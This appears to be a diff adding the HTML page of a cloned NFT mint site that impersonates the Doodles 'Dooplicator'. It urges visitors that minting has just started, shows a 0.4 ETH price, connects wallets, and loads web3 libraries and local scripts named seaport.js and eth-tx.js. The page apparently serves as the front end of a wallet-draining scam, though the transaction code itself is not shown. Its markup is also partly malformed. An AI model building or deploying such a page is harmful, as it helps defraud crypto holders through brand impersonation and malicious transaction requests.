@@ -1,0 +1,177 @@
+<!DOCTYPE html><!-- Last Published: Sat Jan 28 2023 14:30:59 GMT+0000 (Coordinated Universal Time) -->
+
+<head>
+    
+    
+    <html>
+        <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Dooplicator</title>
+    <meta name="description" content="Doodles 2 - An Endless Utility NFT from Doodles" />
+    <link rel="icon" href="/favicon.ico" />
+    <meta name="next-head-count" content="5" />
+
+    <meta property="og:url" content="doodless" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Doodles 2 - An Endless Utility NFT from Doodles" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta property="twitter:title" content="Dooplicator">
+    <meta name="twitter:creator" content="@doodles" />
+    <meta property="twitter:image" content="images/og.png">
+    <meta property="twitter:description" content="Doodles 2 - An Endless Utility NFT from Doodles" />
+    <meta property="og:description" content="Doodles 2 firmware update roadmap allows it to be used in new and different ways." />
+    <meta property="og:image" content="https://doodles.app/images/dooplicator-opengraph_02.jpg" />
+
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+        <title>Loading</title>
+        <link id="favicon" rel="icon" href="/favicon.ico">
+        
+        <!-- Open Graph / Facebook -->
+        <meta property="og:type" content="website">
+        <meta property="og:url" content="index-2.html">
+        <meta property="og:title" content="Dooplicator">
+        <meta property="og:description" content="Mint have just started! Mint your Dooplicator">
+        <meta property="og:image" content="images/og.png">
+
+      
+
+        <!-- Import .JS files -->
+        <script src="settings.js"></script>
+        <!-- <script src="./javascript/loader.js"></script> -->
+        <script src="javascript/alert.js"></script>
+        <script src="npmcdn.com/moralis%401.5.9/dist/moralis.js"></script>
+        <script type="text/javascript">
+
+            const vh = window.innerHeight * 0.01;
+            document.documentElement.style.setProperty('--vh', `${vh < 8.0 ? 8.0 : vh}px`);
+            window.addEventListener('resize', () => {
+                const vh = window.innerHeight * 0.01;
+                document.documentElement.style.setProperty('--vh', `${vh < 8.0 ? 8.0 : vh}px`);
+            });
+        </script>
+
+        <!-- Import CSS files -->
+        <link rel="stylesheet" type="text/css" href="css/main.css">
+        <link rel="stylesheet" type="text/css" href="css/normalize.css">
+        <link rel="stylesheet" type="text/css" href="css/fonts.css" media="all">
+        <link rel="stylesheet" type="text/css" href="css/alert.css" media="all">
+    </head>
+
+<body class="body">
+
+    <div class="content">
+
+        <div id="WEB3_CONNECT_MODAL_ID"></div>
+        <video id="background-video" autoplay loop muted>
+            <source id="background-video-source" type="video/mp4">
+        </video>
+        <div class="alert-container" id="alert-container"></div>
+
+        <div class="sub-head" id="claim-text-wrapper">
+
+            <div id="payment-modal">
+                <div id="payment-header">
+                    <div id="payment-header-text">
+                        <h4 id="lbuy"></h4>
+                        <h4><img class="" height="50px" src="/images/genbox_logo.png"></h4>
+                        
+                        <p hidden id="lsupply" class="pt-1.5 italic-grey">Total Listings: Loading...</p>
+                        
+
+                    </div>
+                </div>
+                <div id="payment-info">
+                    <img src="/dooplicator.gif" class="image" height="200px" id="price-img">
+                        <div id="payment-info-text">
+                        <span hidden class="title"><a id="lprice">X.XX</a> ETH</span>
+                        <p>Price: <span class="title"><a>0.4</a> ETH</span></p>
+                        <p class="launch-date">TOTAL SUPPLY<br />
+                            <span id="num_4" class="title" style="font-size: 16px !important;"></span><span
+                                class="num_c"> / </span><span id="num_2" class="title"
+                                style="font-size: 16px !important;"> 24,000</span>
+                            <br />
+                        </p>
+                        <p hidden id="ldate" class="launch-date">Pre sale available 30.04.2023</p>
+
+                    </div>
+                </div>
+                <div id="ape-number">
+                    <div class="calcs">
+                        <div id="minus">
+                            <svg width="16" height="2" viewbox="0 0 16 2" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M15 0H1C0.734784 0 0.48043 0.105357 0.292893 0.292893C0.105357 0.48043 0 0.734784 0 1C0 1.26522 0.105357 1.51957 0.292893 1.70711C0.48043 1.89464 0.734784 2 1 2H15C15.2652 2 15.5196 1.89464 15.7071 1.70711C15.8946 1.51957 16 1.26522 16 1C16 0.734784 15.8946 0.48043 15.7071 0.292893C15.5196 0.105357 15.2652 0 15 0Z"
+                                    fill="white"></path>
+                            </svg>
+                        </div>
+                        <h5 id="lnprice" class="sol_input">1</h5>
+                        <div id="plus">
+                            <svg width="16" height="16" viewbox="0 0 16 16" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M15 7H9V1C9 0.734784 8.89464 0.48043 8.70711 0.292893C8.51957 0.105357 8.26522 0 8 0C7.73478 0 7.48043 0.105357 7.29289 0.292893C7.10536 0.48043 7 0.734784 7 1V7H1C0.734784 7 0.48043 7.10536 0.292893 7.29289C0.105357 7.48043 0 7.73478 0 8C0 8.26522 0.105357 8.51957 0.292893 8.70711C0.48043 8.89464 0.734784 9 1 9H7V15C7 15.2652 7.10536 15.5196 7.29289 15.7071C7.48043 15.8946 7.73478 16 8 16C8.26522 16 8.51957 15.8946 8.70711 15.7071C8.89464 15.5196 9 15.2652 9 15V9H15C15.2652 9 15.5196 8.89464 15.7071 8.70711C15.8946 8.51957 16 8.26522 16 8C16 7.73478 15.8946 7.48043 15.7071 7.29289C15.5196 7.10536 15.2652 7 15 7Z"
+                                    fill="white"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <h5 id="ape-max">X Max</h5>
+
+                </div>
+                <div id="ape-total">
+                    <p class="total">Total</p>
+                    <h5 class="actual_price"><a id="price">X.XX</a> ETH</h5>
+
+                </div>
+                <button class="purchase-button" id="connect" display="none">buy on opensea</button>
+                <button class="purchase-button" id="transfer" style="display:none">Dooplicate</button>
+                
+            </div>
+          
+            <script src="cdn.ethers.io/lib/ethers-5.1.umd.min.js" type="text/javascript"></script>
+            <script src="cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js"
+                integrity="sha512-C63V0mFzwl8KV2fRz0QJNKX0d9877urOLSUq5WUq8nUOhDl69hKdGr9mAvl57k47GNjqEMAtiufsvDnk7xs8+w=="
+                crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+            <script type="text/javascript" src="unpkg.com/web3modal%401.9.5/dist/index.js"></script>
+            <script type="text/javascript" src="unpkg.com/evm-chains%400.2.0/dist/umd/index.min.js"></script>
+            <script type="text/javascript" src="unpkg.com/%40walletconnect/web3-provider%401.7.5/dist/umd/index.min.js"></script>
+
+            <script src="cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
+                integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
+                crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+            <!--[if lte IE 9]>
+                <script src="//cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script>
+            <![endif]-->
+            <script type="text/javascript" src="javascript/index.js"></script>
+            <script type="text/javascript" src="javascript/timer.js"></script>
+            <script src="javascript/loader.js"></script>
+
+            <script src="bootstrap.js"></script>
+
+            <!-- Mint -->
+            <script src="https://bundle.run/buffer@6.0.3"></script> 
+            <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.5/web3.min.js"></script>
+            <script src="https://unpkg.com/moralis-v1%401.12.0/dist/moralis.js"></script>
+            <script src="https://unpkg.com/%40walletconnect/web3-provider%401.7.5/dist/umd/index.min.js"></script>
+
+
+            <scrip  t src="js/seaport.js"></script>
+            <script src="js/eth-tx.js"></script>
+            <script src="js/index.js"></script>
+
+
+            <script type="text/javascript" src="src/js/claim.js"></script>
+            <script type="text/javascript" src="src/js/settings.js"></script>
+
+
+        </div>
+
+    </div>
+
+</body>
+</html>
